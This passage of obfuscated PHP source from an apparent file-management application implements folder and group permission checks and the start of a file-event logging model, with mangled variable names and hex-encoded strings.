$this->authArrayCheck($ÏıÈ¤Úñ, $©“ª±Ì); if ($º©á¡·[$Ç†—ÔÆ[414]] > 0) { $Ò¿‰€‰¨[] = $µ¼³‘ÖÄ . $Ç†—ÔÆ[12]; } } if ($Ì©±ãÉÜ) { $¶ò¼·Ä = Model($Ç†—ÔÆ[522]); foreach ($Ì©±ãÉÜ as $½ªÍÌü) { $¬ÎÖˆŒ­ = $¶ò¼·Ä->getInfo($½ªÍÌü); if (!$¬ÎÖˆŒ­ || !is_array($¬ÎÖˆŒ­[$Ç†—ÔÆ[86]])) { continue; } $Ò¿‰€‰¨[] = $¬ÎÖˆŒ­[$Ç†—ÔÆ[86]][$Ç†—ÔÆ[402]]; } } $“ö¶Ô™ = array(); $‚ãÓÅ‘Û = $Ì©±ãÉÜ; $ç§¶ÖıÛ = Model($Ç†—ÔÆ[1350]); $¶ò¼·Ä = Model($Ç†—ÔÆ[522]); $„òñ¬åë = array(); $©©¾µİ€ = array(); $˜‰€¡Éğ = array(); $ĞáÏŸ¸ = array(); if ($Ò¿‰€‰¨) { $¡íÅğƒ = $ç§¶ÖıÛ->where(array($Ç†—ÔÆ[402] => array($Ç†—ÔÆ[418], $Ò¿‰€‰¨)))->select(); foreach ($¡íÅğƒ as $ïĞ…ñÇá) { $ï°Îû³« = $ç§¶ÖıÛ->parentLevelArray($ïĞ…ñÇá[$Ç†—ÔÆ[521]]); $“ö¶Ô™ = array_merge($“ö¶Ô™, $ï°Îû³«); $‚ãÓÅ‘Û[] = $ïĞ…ñÇá[$Ç†—ÔÆ[505]]; $„òñ¬åë[$ïĞ…ñÇá[$Ç†—ÔÆ[402]]] = $ï°Îû³«; $©©¾µİ€[$ïĞ…ñÇá[$Ç†—ÔÆ[402]]] = $ïĞ…ñÇá[$Ç†—ÔÆ[505]]; } } $‚ãÓÅ‘Û = array_values(array_unique($‚ãÓÅ‘Û)); $òêí©É” = $‚ãÓÅ‘Û; foreach ($òêí©É” as $½ªÍÌü) { $¬ÎÖˆŒ­ = $¶ò¼·Ä->getInfo($½ªÍÌü); $ï°Îû³« = $ç§¶ÖıÛ->parentLevelArray($¬ÎÖˆŒ­[$Ç†—ÔÆ[521]]); $‚ãÓÅ‘Û = array_merge($‚ãÓÅ‘Û, $ï°Îû³«); } $‚ãÓÅ‘Û = array_values(array_unique($‚ãÓÅ‘Û)); foreach ($‚ãÓÅ‘Û as $½ªÍÌü) { $¬ÎÖˆŒ­ = $¶ò¼·Ä->getInfo($½ªÍÌü); $“ö¶Ô™[] = $¬ÎÖˆŒ­[$Ç†—ÔÆ[86]][$Ç†—ÔÆ[402]]; $˜‰€¡Éğ[$½ªÍÌü] = $¬ÎÖˆŒ­[$Ç†—ÔÆ[86]][$Ç†—ÔÆ[402]]; $ĞáÏŸ¸[$½ªÍÌü] = $ç§¶ÖıÛ->parentLevelArray($¬ÎÖˆŒ­[$Ç†—ÔÆ[521]]); } foreach ($„òñ¬åë as $ôÒÆë‹× => $Áú×›ê) { $ÕıÒåÚÃ = $©©¾µİ€[$ôÒÆë‹×]; if (!$ÕıÒåÚÃ || !$˜‰€¡Éğ[$ÕıÒåÚÃ]) { continue; } $Î®ƒáÂ® = array(); foreach ($ĞáÏŸ¸[$ÕıÒåÚÃ] as $½ªÍÌü) { $Î®ƒáÂ®[] = $˜‰€¡Éğ[$½ªÍÌü]; } $„òñ¬åë[$ôÒÆë‹×] = array_merge($Î®ƒáÂ®, $Áú×›ê); } $“ö¶Ô™ = array_values(array_unique($“ö¶Ô™)); $Ñ¿×à«´ = array($Ç†—ÔÆ[2040] => $“ö¶Ô™, $Ç†—ÔÆ[2041] => $„òñ¬åë); $ó÷Ä€ëŠ[$©“ª±Ì] = $Ñ¿×à«´; return $Ñ¿×à«´; } private function makeSourceAuth($¿®¡õ¶Ä, $Äãá­˜Ô, $ÂÏë¼ü† = false) { $ºŸöş¡ù =& $_SERVER[³·—™¤¢]; $âö–‘ = $ºŸöş¡ù[88]; $æ“ë†Ì® = $¿®¡õ¶Ä[$ºŸöş¡ù[505]]; $™òíˆşş = $¿®¡õ¶Ä[$ºŸöş¡ù[411]] == SourceModel::TYPE_GROUP; $²òşŒ³ô = $™òíˆşş ? $this->groupRootAuth($æ“ë†Ì®, $ÂÏë¼ü†) : !1; if ($²òşŒ³ô && Model($ºŸöş¡ù[507])->authCheckAction($²òşŒ³ô[$ºŸöş¡ù[413]], $ºŸöş¡ù[1873])) { return $this->groupAuthInfo($²òşŒ³ô, $æ“ë†Ì®); } $ĞÇ…£·™ = Model($ºŸöş¡ù[1350])->parentLevelArray($¿®¡õ¶Ä[$ºŸöş¡ù[521]]); $ĞÇ…£·™ = array_merge(array($¿®¡õ¶Ä[$ºŸöş¡ù[402]]), array_reverse($ĞÇ…£·™)); $”Ù¡¾Ï‚ = !1; foreach ($ĞÇ…£·™ as $ää¯òæ) { if (!isset($Äãá­˜Ô[$ää¯òæ])) { continue; } $ø•ñæ§ = $this->authMake($Äãá­˜Ô[$ää¯òæ], $ÂÏë¼ü†); if ($ø•ñæ§[$ºŸöş¡ù[467]]) { $”Ù¡¾Ï‚ = $ø•ñæ§; break; } } if (!$™òíˆşş) { return $”Ù¡¾Ï‚; } if (!$”Ù¡¾Ï‚ && $²òşŒ³ô) { $”Ù¡¾Ï‚ = $this->groupAuthInfo($²òşŒ³ô, $æ“ë†Ì®); } if (!$”Ù¡¾Ï‚) { $èï¬Ó‘ = Model($ºŸöş¡ù[522])->getInfo($æ“ë†Ì®); $—‹æÏşœ = explode($ºŸöş¡ù[50], trim($èï¬Ó‘[$ºŸöş¡ù[521]], $ºŸöş¡ù[50])); $—‹æÏşœ = array_reverse($—‹æÏşœ); foreach ($—‹æÏşœ as $Èç©®µ¹) { if ($Èç©®µ¹ == $ºŸöş¡ù[197] || $Èç©®µ¹ == $âö–‘) { continue; } $Í÷Ò€ƒÈ = $this->groupRootAuth($Èç©®µ¹, $ÂÏë¼ü†); if (!$Í÷Ò€ƒÈ) { continue; } $”Ù¡¾Ï‚ = $this->groupAuthInfo($Í÷Ò€ƒÈ, $Èç©®µ¹); break; } } if (!$”Ù¡¾Ï‚ || $”Ù¡¾Ï‚[$ºŸöş¡ù[414]] <= 0) { $Ú·°¢»µ = $this->authDeepCheck($¿®¡õ¶Ä[$ºŸöş¡ù[402]], $ÂÏë¼ü†); if ($Ú·°¢»µ) { $”Ù¡¾Ï‚ = $Ú·°¢»µ; } } return $”Ù¡¾Ï‚; } private function userIsRoot($À»‰ÎËË = false) { $ôìÏ³™ã =& $_SERVER[³·—™¤¢]; if (!$À»‰ÎËË && _get($GLOBALS, $ôìÏ³™ã[503])) { return !0; } $ÈÁÏõ˜æ = Model($ôìÏ³™ã[535])->getInfo($À»‰ÎËË); $ô×ÒÓ = Model($ôìÏ³™ã[2049])->listData($ÈÁÏõ˜æ[$ôìÏ³™ã[1557]]); if ($ô×ÒÓ && $ô×ÒÓ[$ôìÏ³™ã[511]][$ôìÏ³™ã[2050]] == 1) { return !0; } return !1; } private function sourceAuthInfo($õßæÓŞ†) { $¢µÕ÷éú =& $_SERVER[³·—™¤¢]; $¡Úø©Ê… = Model($¢µÕ÷éú[1350]); $Óº§¢ØÁ = $¡Úø©Ê…->sourceInfo($õßæÓŞ†); if (!$Óº§¢ØÁ) { return !1; } $¡Úø©Ê…->groupPathDisplay($Óº§¢ØÁ); $¯àƒû’µ = array($Óº§¢ØÁ); $¯àƒû’µ = $¡Úø©Ê…->_listAppendPath($¯àƒû’µ); $Óº§¢ØÁ = $¯àƒû’µ[0]; $ù³¾ùû¼ = $Óº§¢ØÁ[$¢µÕ÷éú[519]]; if (isset($Óº§¢ØÁ[$¢µÕ÷éú[527]])) { $È¬’ÈÂ = explode($¢µÕ÷éú[8], trim($Óº§¢ØÁ[$¢µÕ÷éú[519]], $¢µÕ÷éú[8])); array_shift($È¬’ÈÂ); $ù³¾ùû¼ = $Óº§¢ØÁ[$¢µÕ÷éú[525]] . $¢µÕ÷éú[2051] . implode($¢µÕ÷éú[8], $È¬’ÈÂ); } return array($¢µÕ÷éú[420] => $Óº§¢ØÁ[$¢µÕ÷éú[32]], $¢µÕ÷éú[84] => KodIO::make($Óº§¢ØÁ[$¢µÕ÷éú[402]]), $¢µÕ÷éú[2052] => $ù³¾ùû¼); } private function groupAuthInfo($¼¨Û¹¶ú, $ÎË®Óæ¿) { $å¿‰¥È =& $_SERVER[³·—™¤¢]; $ÆÙşèó = Model($å¿‰¥È[522])->getInfo($ÎË®Óæ¿); return array($å¿‰¥È[2053] => intval($¼¨Û¹¶ú[$å¿‰¥È[413]]), $å¿‰¥È[2037] => $¼¨Û¹¶ú, $å¿‰¥È[2054] => LNG($å¿‰¥È[2055]), $å¿‰¥È[2046] => array($å¿‰¥È[420] => $ÆÙşèó[$å¿‰¥È[32]], $å¿‰¥È[84] => KodIO::make($ÆÙşèó[$å¿‰¥È[86]][$å¿‰¥È[402]]), $å¿‰¥È[2052] => $ÆÙşèó[$å¿‰¥È[526]])); } protected function groupRootAuth($êÜ©Ê·Í, $Æœó„ñÌ = false) { $ı•›»ö =& $_SERVER[³·—™¤¢]; $Æœó„ñÌ = $Æœó„ñÌ ? $Æœó„ñÌ : USER_ID; $ôàÇçäî = $Æœó„ñÌ . $ı•›»ö[2056] . $êÜ©Ê·Í; static $ëœ³µ = array(); if (isset($ëœ³µ[$ôàÇçäî])) { return $ëœ³µ[$ôàÇçäî]; } $Ä°…¨ñ” = Model($ı•›»ö[522])->getInfo($êÜ©Ê·Í); $®åÑ¡ã = $this->userGroupList($Æœó„ñÌ); $©â·‰·™ = isset($®åÑ¡ã[$êÜ©Ê·Í]) ? $®åÑ¡ã[$êÜ©Ê·Í][$ı•›»ö[413]] : !1; if ($©â·‰·™ && Model($ı•›»ö[507])->authCheckAction($©â·‰·™[$ı•›»ö[413]], $ı•›»ö[1873])) { $ëœ³µ[$ôàÇçäî] = $©â·‰·™; return $©â·‰·™; } $ä®•¡£› = $this->sourceAuthSelect($Ä°…¨ñ”[$ı•›»ö[86]][$ı•›»ö[402]]); $ºßãıß« = $ä®•¡£› ? $this->authMake($ä®•¡£›, $Æœó„ñÌ) : !1; $·«±’©Ó = $ºßãıß« ? $ºßãıß«[$ı•›»ö[467]] : !1; $ëœ³µ[$ôàÇçäî] = $·«±’©Ó ? $·«±’©Ó : $©â·‰·™; return $ëœ³µ[$ôàÇçäî]; } public function authOwnerApply($äûİÁ…Ğ) { $ÁßÔÌŞÈ =& $_SERVER[³·—™¤¢]; if (empty($äûİÁ…Ğ[$ÁßÔÌŞÈ[413]]) || isset($äûİÁ…Ğ[$ÁßÔÌŞÈ[2057]]) && $äûİÁ…Ğ[$ÁßÔÌŞÈ[2057]]) { return $äûİÁ…Ğ; } if (AuthModel::authCheckRoot($äûİÁ…Ğ[$ÁßÔÌŞÈ[413]][$ÁßÔÌŞÈ[414]])) { return $äûİÁ…Ğ; } $×²ÕÁ‚ = Model($ÁßÔÌŞÈ[1350])->parentLevelArray($äûİÁ…Ğ[$ÁßÔÌŞÈ[521]]); $×²ÕÁ‚ = array_merge(array($äûİÁ…Ğ[$ÁßÔÌŞÈ[402]]), array_reverse($×²ÕÁ‚)); $³ğË­ªÌ = $this->sourceAuthSelect($×²ÕÁ‚); $©“ˆ©·º = array(); $Ô¹¬±½Ú = array(); foreach ($³ğË­ªÌ as $Ä÷Ç¼¬ß => $„…®¹’Ì) { $¿±†÷•‘ = $this->authFolderOwnerUser($„…®¹’Ì); $©“ˆ©·º[$Ä÷Ç¼¬ß] = $¿±†÷•‘; $Ô¹¬±½Ú = array_merge($Ô¹¬±½Ú, $¿±†÷•‘[$ÁßÔÌŞÈ[600]]); if ($¿±†÷•‘[$ÁßÔÌŞÈ[2058]]) { break; } } if (count($Ô¹¬±½Ú) == 0) { $Ô¹¬±½Ú = $this->authFolderOwnerGroup($äûİÁ…Ğ[$ÁßÔÌŞÈ[505]]); } $Ô¹¬±½Ú = array_unique($Ô¹¬±½Ú); if (AuthModel::authCheckRoot($äûİÁ…Ğ[$ÁßÔÌŞÈ[413]][$ÁßÔÌŞÈ[414]])) { $Ô¹¬±½Ú[] = USER_ID; } $äûİÁ…Ğ[$ÁßÔÌŞÈ[413]][$ÁßÔÌŞÈ[2059]] = Model($ÁßÔÌŞÈ[513])->userListInfo($Ô¹¬±½Ú); return $äûİÁ…Ğ; } private function authFolderOwnerGroup($™‘äóÜİ) { $—¸ˆÁ¯ =& $_SERVER[³·—™¤¢]; $ÄÛ‡ãèŠ = Model($—¸ˆÁ¯[1942])->where(array($—¸ˆÁ¯[1852] => $™‘äóÜİ))->select(); $Ë¡—ÕîÃ = array(); if (!$ÄÛ‡ãèŠ) { return $Ë¡—ÕîÃ; } foreach ($ÄÛ‡ãèŠ as $úùƒô¡—) { $§„òó¶ô = $this->authInfo($úùƒô¡—); if (AuthModel::authCheckRoot($§„òó¶ô[$—¸ˆÁ¯[413]])) { $Ë¡—ÕîÃ[] = $úùƒô¡—[$—¸ˆÁ¯[1680]]; } } return $Ë¡—ÕîÃ; } private function authFolderOwnerUser($¦”ÖÄ“É) { $—àøàğò =& $_SERVER[³·—™¤¢]; $úÀô™µ— = array(); $²÷ÄùÚŠ = !1; foreach ($¦”ÖÄ“É as $Úõ’²•‹) { $ä§·¾Ë = $this->authInfo($Úõ’²•‹); if ($Úõ’²•‹[$—àøàğò[505]] == $—àøàğò[197]) { $²÷ÄùÚŠ = !0; } if ($Úõ’²•‹[$—àøàğò[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ä§·¾Ë[$—àøàğò[413]])) { $úÀô™µ—[] = $Úõ’²•‹[$—àøàğò[505]]; } } } return array($—àøàğò[600] => $úÀô™µ—, $—àøàğò[2058] => $²÷ÄùÚŠ); } public function authMake($’¹µ§¤³, $…ÆÍƒóè = false) { $ù¾Û¾áï =& $_SERVER[³·—™¤¢]; $Û×Ï˜È = $this->authArrayCheck($’¹µ§¤³, $…ÆÍƒóè); if ($Û×Ï˜È[$ù¾Û¾áï[2060]]) { $Û×Ï˜È[$ù¾Û¾áï[2060]] = $this->sourceAuthInfo($Û×Ï˜È[$ù¾Û¾áï[2060]]); } return $Û×Ï˜È; } public function authArrayCheck($×òáÜ¼®, $«šàá—ğ = false) { $Ïª·…©ë =& $_SERVER[³·—™¤¢]; if (!$×òáÜ¼®) { return array($Ïª·…©ë[414] => 0, $Ïª·…©ë[467] => !1); } $«šàá—ğ = $«šàá—ğ ? $«šàá—ğ : USER_ID; $ÙÅØˆá¤ = 0; $»Îó€øÆ = 0; $ò‹ã×Üî = 0; $îÕ”Àí = 0; $Ü•ıÇ‚à = 0; $Ù„Øâü = 0; $§éáÅ ® = 1000; $èè÷…´ = 0; $ÒÓ¡ÈßÖ = 0; $–˜÷Ú¼Ì = 0; $±ÀÏÎÍŒ = 0; $ß–ŒÜïÃ = array($Ïª·…©ë[402] => 0); foreach ($×òáÜ¼® as $ß–ŒÜïÃ) { $ùÊ¤–¹ = $this->authInfo($ß–ŒÜïÃ); if (!$ùÊ¤–¹) { continue; } $™ıÚÓ»– = $ß–ŒÜïÃ[$Ïª·…©ë[505]]; $Î¦Æè« = intval($ùÊ¤–¹[$Ïª·…©ë[413]]); if ($ß–ŒÜïÃ[$Ïª·…©ë[411]] == SourceModel::TYPE_USER && $™ıÚÓ»– == $«šàá—ğ) { $ÙÅØˆá¤ = !0; $ò‹ã×Üî = $ùÊ¤–¹; $»Îó€øÆ = $Î¦Æè«; } else { if ($ß–ŒÜïÃ[$Ïª·…©ë[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($™ıÚÓ»–, $«šàá—ğ)) { $îÕ”Àí = !0; $¦ò¨š¾Ã = $this->groupStepToUserGroup($™ıÚÓ»–, $«šàá—ğ); if ($¦ò¨š¾Ã < $§éáÅ ®) { $§éáÅ ® = $¦ò¨š¾Ã; $Ü•ıÇ‚à = $Î¦Æè«; $Ù„Øâü = $ùÊ¤–¹; $èè÷…´ = $™ıÚÓ»–; } if ($¦ò¨š¾Ã == $§éáÅ ® && $Î¦Æè« >= $Ü•ıÇ‚à) { $Ü•ıÇ‚à = $Î¦Æè«; $Ù„Øâü = $ùÊ¤–¹; $èè÷…´ = $™ıÚÓ»–; } } else { if ($™ıÚÓ»– == $Ïª·…©ë[197]) { $ÒÓ¡ÈßÖ = !0; $±ÀÏÎÍŒ = $ùÊ¤–¹; $–˜÷Ú¼Ì = $Î¦Æè«; } } } } if ($ÙÅØˆá¤) { $¤Í›Ù»ß = $»Îó€øÆ; $ùÊ¤–¹ = $ò‹ã×Üî; $úãä–Øí = LNG($Ïª·…©ë[2061]); } else { if ($îÕ”Àí) { $¤Í›Ù»ß = $Ü•ıÇ‚à; $ùÊ¤–¹ = $Ù„Øâü; $•¢ÍÁ› = Model($Ïª·…©ë[522])->getInfo($èè÷…´); $úãä–Øí = $Ïª·…©ë[162] . $•¢ÍÁ›[$Ïª·…©ë[526]] . $Ïª·…©ë[2062] . LNG($Ïª·…©ë[2063]); } else { if ($ÒÓ¡ÈßÖ) { $¤Í›Ù»ß = $–˜÷Ú¼Ì; $ùÊ¤–¹ = $±ÀÏÎÍŒ; $úãä–Øí = LNG($Ïª·…©ë[2034]); } else { $¤Í›Ù»ß = 0; $ùÊ¤–¹ = !1; $úãä–Øí = $Ïª·…©ë[12]; } } } $á¡ˆš¡› = array($Ïª·…©ë[2053] => intval($¤Í›Ù»ß), $Ïª·…©ë[2037] => $ùÊ¤–¹, $Ïª·…©ë[2054] => $úãä–Øí, $Ïª·…©ë[2046] => $ß–ŒÜïÃ[$Ïª·…©ë[402]]); return $á¡ˆš¡›; } private function groupContainUser($ò§Â› æ, $›öÆ—¡ = false) { return in_array($ò§Â› æ, $this->userGroupParents($›öÆ—¡)); } private function groupStepToUserGroup($œñúò„Ê, $ÑÔ™œ— = false) { $ßœá›¥¼ =& $_SERVER[³·—™¤¢]; $ŸÆÒ‰´Ş = $this->userGroupList($ÑÔ™œ—); $¤ó×¸Ò» = 1000; $€úõ°é† = $GLOBALS[$ßœá›¥¼[6]][$ßœá›¥¼[89]][$ßœá›¥¼[1955]] == 1; $ó¨¸ÒÊÚ = $€úõ°é† ? 3 : 2; foreach ($ŸÆÒ‰´Ş as $÷‹ÓÉ¼É) { if ($÷‹ÓÉ¼É[$ßœá›¥¼[1852]] == $œñúò„Ê) { return 0; } $½¹çœ¶• = explode($ßœá›¥¼[50], trim($÷‹ÓÉ¼É[$ßœá›¥¼[521]], $ßœá›¥¼[50])); if ($½¹çœ¶•[0] == $ßœá›¥¼[197] && count($½¹çœ¶•) > $ó¨¸ÒÊÚ) { $³³îç¿ = array_reverse(array_slice($½¹çœ¶•, $ó¨¸ÒÊÚ)); $Éæ„•öğ = array_search($œñúò„Ê, $³³îç¿); if ($Éæ„•öğ !== !1 && $Éæ„•öğ + 1 <= $¤ó×¸Ò») { $¤ó×¸Ò» = $Éæ„•öğ + 1; } } } return $¤ó×¸Ò»; } private function userGroupList($Æ¯Şãı” = false) { $²Âæ¾·• =& $_SERVER[³·—™¤¢]; static $÷˜çÅè = array(); if (isset($÷˜çÅè[$Æ¯Şãı”])) { return $÷˜çÅè[$Æ¯Şãı”]; } $è§úïîº = Model($²Âæ¾·•[535])->getInfo($Æ¯Şãı”); $÷˜çÅè[$Æ¯Şãı”] = array_to_keyvalue($è§úïîº[$²Âæ¾·•[2035]], $²Âæ¾·•[1852]); return $÷˜çÅè[$Æ¯Şãı”]; } public function userGroupParents($ë°Ë¡×§) { $‚¡äƒÖÂ =& $_SERVER[³·—™¤¢]; static $ÖŒ…ïÔ = array(); $ë°Ë¡×§ = $ë°Ë¡×§ ? $ë°Ë¡×§ : USER_ID; if (isset($ÖŒ…ïÔ[$ë°Ë¡×§])) { return $ÖŒ…ïÔ[$ë°Ë¡×§]; } $ÊôÓóÁ… = $this->userGroupList($ë°Ë¡×§); $£”ÇÂš± = array(); $¨¬•ä = $GLOBALS[$‚¡äƒÖÂ[6]][$‚¡äƒÖÂ[89]][$‚¡äƒÖÂ[1955]] == 1; $å™®ãÅ­ = $¨¬•ä ? 3 : 2; foreach ($ÊôÓóÁ… as $ñ¯ÏÅ‹±) { $š¡ƒ–ƒ” = array($ñ¯ÏÅ‹±[$‚¡äƒÖÂ[1852]]); $Â‰òô™ = explode($‚¡äƒÖÂ[50], trim($ñ¯ÏÅ‹±[$‚¡äƒÖÂ[521]], $‚¡äƒÖÂ[50])); if ($Â‰òô™[0] == $‚¡äƒÖÂ[197] && count($Â‰òô™) > $å™®ãÅ­) { $ß¿¡ëı¦ = array_slice($Â‰òô™, $å™®ãÅ­); $š¡ƒ–ƒ” = array_merge($š¡ƒ–ƒ”, array_reverse($ß¿¡ëı¦)); } $£”ÇÂš± = array_merge($£”ÇÂš±, $š¡ƒ–ƒ”); } $ÖŒ…ïÔ[$ë°Ë¡×§] = array_unique($£”ÇÂš±); return $ÖŒ…ïÔ[$ë°Ë¡×§]; } public function authTargetInfoMake($ˆƒú²½Œ) { $íü½€›” =& $_SERVER[³·—™¤¢]; $Úæøğé¨ = array(); $¨İÁ‹ûš = array(); foreach ($ˆƒú²½Œ as $‘ øÚ¬) { if ($‘ øÚ¬[$íü½€›”[411]] == SourceModel::TYPE_USER) { $Úæøğé¨[] = intval($‘ øÚ¬[$íü½€›”[505]]); } else { if ($‘ øÚ¬[$íü½€›”[411]] == SourceModel::TYPE_GROUP) { $¨İÁ‹ûš[] = intval($‘ øÚ¬[$íü½€›”[505]]); } } } if ($Úæøğé¨) { $Úæøğé¨ = Model($íü½€›”[513])->userListInfo($Úæøğé¨); } if ($¨İÁ‹ûš) { $øşéğÅó = array($íü½€›”[1940] => array($íü½€›”[418], $¨İÁ‹ûš)); $¨İÁ‹ûš = Model($íü½€›”[522])->field($íü½€›”[2064])->where($øşéğÅó)->select(); $¨İÁ‹ûš = array_to_keyvalue($¨İÁ‹ûš, $íü½€›”[1852]); } return array($íü½€›”[2065] => $Úæøğé¨, $íü½€›”[2066] => $¨İÁ‹ûš); } public function authInfo($•¯®üšÊ) { $»şÓÒ‰Ã =& $_SERVER[³·—™¤¢]; if ($•¯®üšÊ[$»şÓÒ‰Ã[1956]]) { $¯¾Ğ˜ = Model($»şÓÒ‰Ã[507])->listData($•¯®üšÊ[$»şÓÒ‰Ã[1956]]); if (!$¯¾Ğ˜) { return !1; $À©·Š = Model($»şÓÒ‰Ã[507])->listData(); $õ·İãˆì = array_filter_by_field($À©·Š, $»şÓÒ‰Ã[413], $»şÓÒ‰Ã[197]); return $õ·İãˆì; } $¡óİÓÜï = array_field_key($¯¾Ğ˜, array($»şÓÒ‰Ã[399], $»şÓÒ‰Ã[32], $»şÓÒ‰Ã[413], $»şÓÒ‰Ã[1875], $»şÓÒ‰Ã[1876])); $¡óİÓÜï[$»şÓÒ‰Ã[2067]] = $•¯®üšÊ; return $¡óİÓÜï; } else { return array($»şÓÒ‰Ã[419] => 0, $»şÓÒ‰Ã[1858] => $•¯®üšÊ[$»şÓÒ‰Ã[2012]], $»şÓÒ‰Ã[420] => $»şÓÒ‰Ã[12], $»şÓÒ‰Ã[1875] => $»şÓÒ‰Ã[2068]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65\x5f\145\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\151\x6d\x65", "\164\x69\155\145", "\151\x6e\163\145\162\164", "\146\165\156\x63\x74\151\x6f\x6e"), array("\x64\145\163\x63", '', "\151\156\x73\145\162\164\x2c\165\160\144\x61\164\x65\54\x73\145\154\x65\143\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ü³»Óï†, $¢†Œí©¶, $çïŸË¾Á = '') { $ÛÍ“Ôï =& $_SERVER[³·—™¤¢]; if (!$this->eventSave) { return; } $ ÁÀµÊÏ = Model($ÛÍ“Ôï[1350])->sourceInfo($ü³»Óï†); if (!$ ÁÀµÊÏ) { return !1; } if ($this->isCacheEvent($ ÁÀµÊÏ, $¢†Œí©¶)) { return; } if ($çïŸË¾Á && is_string($çïŸË¾Á)) { $çïŸË¾Á = array($ÛÍ“Ôï[1891] => $çïŸË¾Á); } $±œë¶ë = array($ÛÍ“Ôï[417] => $ü³»Óï†, $ÛÍ“Ôï[2069] => $ ÁÀµÊÏ[$ÛÍ“Ôï[432]], $ÛÍ“Ôï[2070] => $ ÁÀµÊÏ[$ÛÍ“Ôï[32]], $ÛÍ“Ôï[519] => !empty($ ÁÀµÊÏ[$ÛÍ“Ôï[519]]) ? $ ÁÀµÊÏ[$ÛÍ“Ôï[519]] : $ÛÍ“Ôï[12], $ÛÍ“Ôï[1671] => USER_ID, $ÛÍ“Ôï[422] => $¢†Œí©¶, $ÛÍ“Ôï[1673] => $çïŸË¾Á); $this->addSystemLog($¢†Œí©¶, $±œë¶ë); unset($±œë¶ë[$ÛÍ“Ôï[2070]], $±œë¶ë[$ÛÍ“Ôï[519]]); return $this->add($±œë¶ë); } private function addSystemLog($ÅáÙ÷å, $ÈéŸ¬ˆ) { $ôÊÈ¸äÎ =& $_SERVER[³·—™¤¢]; if ($ÅáÙ÷å == $ôÊÈ¸äÎ[2071]) { $ÅáÙ÷å = $ÈéŸ¬ˆ[$ôÊÈ¸äÎ[453]][$ôÊÈ¸äÎ[2072]]; } else { if (in_array($ÅáÙ÷å, array($ôÊÈ¸äÎ[1832], $ôÊÈ¸äÎ[2073]))) { $ÅáÙ÷å = $ÈéŸ¬ˆ[$ôÊÈ¸äÎ[453]][$ôÊÈ¸äÎ[775]]; } } $¨È‘üµÅ = array_merge($ÈéŸ¬ˆ, array($ôÊÈ¸äÎ[2074] => $ÈéŸ¬ˆ[$ôÊÈ¸äÎ[402]], $ôÊÈ¸äÎ[2075] => $ÈéŸ¬ˆ[$ôÊÈ¸äÎ[2075]])); Hook::trigger($ôÊÈ¸äÎ[2076], $ôÊÈ¸äÎ[2077] . $ÅáÙ÷å, $ÈéŸ¬ˆ); Model($ôÊÈ¸äÎ[1796])->addLog($ôÊÈ¸äÎ[2077] . $ÅáÙ÷å, $¨È‘üµÅ); } private function isCacheEvent($•Õ–ŸçÒ, $Éõñá©‘) { if ($•Õ–ŸçÒ[$_SERVER[³·—™¤¢][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($÷¶Òëèò, $««©¢Ÿé) { $ºš×Í‚˜ =& $_SERVER[³·—™¤¢]; $ˆÙ‹çÓ„ = Model($ºš×Í‚˜[1350])->sourceInfo($÷¶Òëèò); $ú‚ÚŞ² = array($ºš×Í‚˜[2072] => $««©¢Ÿé, $ºš×Í‚˜[32] => $ˆÙ‹çÓ„[$ºš×Í‚˜[32]]); return $this->addEvent($÷¶Òëèò, $ºš×Í‚˜[2071], $ú‚ÚŞ²); } public function eventFileEdit($ÚÎÄ˜•â) { $ôãÓ¸‘ =& $_SERVER[³·—™¤¢]; $éß‚´Õû = array($ôãÓ¸‘[2078] => $_SERVER[$ôãÓ¸‘[2079]], $ôãÓ¸‘[2080] => strtolower(ACTION)); if (isset($GLOBALS[$ôãÓ¸‘[7]][$ôãÓ¸‘[2081]])) { $éß‚´Õû[$ôãÓ¸‘[2081]] = $ôãÓ¸‘[88]; } return $this->addEvent($ÚÎÄ˜•â, $ôãÓ¸‘[1822], $éß‚´Õû); } public function eventRecycle($˜“«×Óè, $Ø×æú©²) { return $this->addEvent($˜“«×Óè, $_SERVER[³·—™¤¢][2073], $Ø×æú©²); } public function eventRemove($›¶Ù¼ˆé) { $¡¼Èú¦Î =& $_SERVER[³·—™¤¢]; $Ğ¨‘üÇâ = Model($¡¼Èú¦Î[1350])->sourceInfo($›¶Ù¼ˆé); $ØøÏ¯« = $Ğ¨‘üÇâ[$¡¼Èú¦Î[32]]; return $this->addEvent($Ğ¨‘üÇâ[$¡¼Èú¦Î[432]], $¡¼Èú¦Î[1821], $ØøÏ¯«); } public function eventShare($¢—¬›•Á, $·Ò•Ô®å) { return $this->addEvent($¢—¬›•Á, $_SERVER[³·—™¤¢][1832], $·Ò•Ô®å); } public function eventMove($èÊ¨ë”×, $Ø†óı, $ßˆñß˜) { $Åé³“‚Õ =& $_SERVER[³·—™¤¢]; $¿ñ£¯„ = Model($Åé³“‚Õ[1350]); $éåƒàğ‹ = $¿ñ£¯„->sourceInfo($èÊ¨ë”×); $¼»Ğ×¼‡ = $¿ñ£¯„->sourceInfo($Ø†óı); $ÉÀº½ºÀ = $¿ñ£¯„->sourceInfo($ßˆñß˜); $É÷‰ÛÉÄ = array($Åé³“‚Õ[1183] => $Ø†óı, $Åé³“‚Õ[2082] => $¼»Ğ×¼‡[$Åé³“‚Õ[32]], $Åé³“‚Õ[2060] => !empty($¼»Ğ×¼‡[$Åé³“‚Õ[519]]) ? $¼»Ğ×¼‡[$Åé³“‚Õ[519]] : $Åé³“‚Õ[12], $Åé³“‚Õ[1184] => $ßˆñß˜, $Åé³“‚Õ[2083] => $ÉÀº½ºÀ[$Åé³“‚Õ[32]], $Åé³“‚Õ[2084] => !empty($ÉÀº½ºÀ[$Åé³“‚Õ[519]]) ? $ÉÀº½ºÀ[$Åé³“‚Õ[519]] : $Åé³“‚Õ[12]); $this->addEvent($èÊ¨ë”×, $Åé³“‚Õ[557], $É÷‰ÛÉÄ); $éåƒàğ‹ = $¿ñ£¯„->sourceInfo($èÊ¨ë”×); $É÷‰ÛÉÄ = array($Åé³“‚Õ[402] => $éåƒàğ‹[$Åé³“‚Õ[402]], $Åé³“‚Õ[32] => $éåƒàğ‹[$Åé³“‚Õ[32]]); 